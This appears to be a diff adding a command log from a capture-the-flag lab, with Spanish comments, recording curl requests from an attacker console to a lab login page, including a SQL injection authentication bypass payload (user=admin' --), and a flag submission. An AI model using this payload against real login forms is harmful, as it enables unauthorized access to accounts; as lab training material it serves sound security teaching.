@@ -1,0 +1,6 @@
+# Comandos ejecutados desde la consola atacante (cyberlab-attacker), en orden
+
+# --- R1: SQL injection, bypass de autenticacion ---
+curl -sS -i -X POST http://phantomcorp/login --data-urlencode 'user=test' --data-urlencode 'pass=test'
+curl -sS -i -X POST http://phantomcorp/login --data-urlencode "user=admin' --" --data-urlencode 'pass=cualquiercosa'
+./ctf submit 07 R1 'FLAG{...}'
